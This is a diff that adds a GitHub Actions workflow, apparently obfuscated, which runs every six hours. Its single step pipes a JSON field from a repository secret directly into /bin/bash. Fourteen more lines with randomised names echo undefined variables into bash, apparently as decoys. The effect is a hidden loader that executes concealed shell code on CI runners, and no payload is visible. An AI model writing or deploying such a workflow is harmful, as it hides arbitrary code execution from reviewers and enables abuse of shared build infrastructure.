@@ -1,0 +1,32 @@
+name: weishenmeda
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weishenmeda
+        env:
+          ajdm3: ${{ secrets.ajdm3 }}
+        run: |
+          echo $ajdm3 | jq -r .ufcuz491 | /bin/bash
+          echo $fjvia80 | jq -r .ylne33293 | /bin/bash
+          echo $zbq799 | jq -r .i752 | /bin/bash
+          echo $vta182 | jq -r .iaqr099 | /bin/bash
+          echo $icrby105 | jq -r .ibzw0 | /bin/bash
+          echo $ndy5 | jq -r .momt70929 | /bin/bash
+          echo $ocewj17833 | jq -r .qtcs19859 | /bin/bash
+          echo $py1859 | jq -r .bowsi44851 | /bin/bash
+          echo $uox2 | jq -r .si16233 | /bin/bash
+          echo $hn28429 | jq -r .r5097 | /bin/bash
+          echo $qcm928 | jq -r .jdy2 | /bin/bash
+          echo $t8 | jq -r .irsou7 | /bin/bash
+          echo $xriw47 | jq -r .mu0831 | /bin/bash
+          echo $zni11265 | jq -r .y8015 | /bin/bash
+          echo $infpz61391 | jq -r .bybmi23212 | /bin/bash
+
